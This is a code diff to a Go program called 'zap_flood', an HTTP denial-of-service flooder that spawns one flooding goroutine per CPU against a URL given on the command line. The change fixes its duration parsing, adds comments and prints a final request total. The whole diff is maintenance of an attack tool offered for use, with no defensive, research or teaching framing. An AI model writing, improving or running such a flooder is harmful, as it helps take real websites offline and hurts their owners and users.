@@ -7,6 +7,7 @@ import (
 	"sync/atomic"
 	"time"
 	"runtime"
+	"strconv"
 )
 
 var counter uint64
@@ -36,14 +37,24 @@ func flood(target string, duration int) {
 
 func main() {
 	if len(os.Args) < 3 {
-		fmt.Println("Usage: zap_flood <url> <duration>")
+		fmt.Println("Usage: zap_flood <url> <duration_in_seconds>")
 		return
 	}
+
+	// Get the target URL and duration from the command-line arguments
 	target := os.Args[1]
-	duration := atoi(os.Args[2])
 
-	fmt.Printf("Launching HTTP flood on %s for %ds using %d threads\n", target, duration, runtime.NumCPU())
+	// Parse the duration input
+	duration, err := strconv.Atoi(os.Args[2])
+	if err != nil {
+		fmt.Println("Invalid duration. Please provide a valid number for duration.")
+		return
+	}
 
+	// Display the message about the flood
+	fmt.Printf("Launching HTTP flood on %s for %d seconds using %d threads\n", target, duration, runtime.NumCPU())
+
+	// Start the flood with the given duration and target
 	for i := 0; i < runtime.NumCPU(); i++ {
 		go flood(target, duration)
 	}
@@ -65,9 +76,7 @@ loop:
 			break loop
 		}
 	}
-}
 
-func atoi(s string) int {
-	i, _ := fmt.Sscanf(s, "%d", new(int))
-	return i
+	// End the attack
+	fmt.Printf("Flooding ended. Total Requests: %d\n", counter)
 }
